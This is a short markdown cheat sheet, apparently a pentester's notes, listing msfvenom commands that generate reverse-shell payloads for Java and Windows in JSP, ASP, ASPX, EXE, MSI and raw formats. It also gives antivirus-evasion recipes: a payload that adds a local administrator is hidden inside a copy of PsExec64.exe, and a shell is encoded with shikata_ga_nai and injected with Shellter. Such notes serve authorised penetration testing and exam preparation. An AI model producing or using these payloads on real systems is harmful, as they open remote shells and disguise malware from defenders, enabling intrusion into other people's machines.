# reverse shells

## tipps

- Specify architecture for windows reverse shells!
- Check windows version if its new its probably x64
- use commen ports such as 80, 443, 53

## general

### list payloads

```bash
msfvenom -l payloads
```

### list encoders

```bash
msfvenom -l encoders
```

## java

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST="$LHOST" LPORT=443 -f raw > shell.jsp
```

## windows

### generate asp reverse shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=5555 -f asp > shell.asp
```

### generate exe reverse shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=5555 -f exe -o reverse.exe
```

### generate msi reverse shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=5555 -f msi -o reverse.msi
```

### generate windows rev shell without bad chars

```
msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=5555 -b "\x00\xotherchars" -f rb
```

### generate aspx reverse shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=80 -f aspx > reverse.aspx
```

### powershell reverse shell

```bash
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=<lhost> LPORT=5555 -f exe -o rev.exe
```

### raw reverse with encoder

```bash
msfvenom -p windows/shell_reverse_tcp -e cmd/powershell_base64 -b '\x0a\xotherbadchars' LHOST=<lhost> LPORT=5555 > shell.raw
```

### av evasion/bypass with legit binary

```bash
msfvenom -p windows/x64/exec CMD="net localgroup administrators <some_user> /add" -f exe -x PsExec64.exe -o PsExec642.exe

msfvenom -p windows/shell_reverse_tcp LHOST="$RHOST" LPORT=80 -f exe -e x86/shikata_ga_nai -i 8 -f raw -o rev.raw
shellter -> (A)utomatic -> (N)o Stealthmode -> (C)ustom: Path to rev.raw -> (N)o reflective dll loader
```
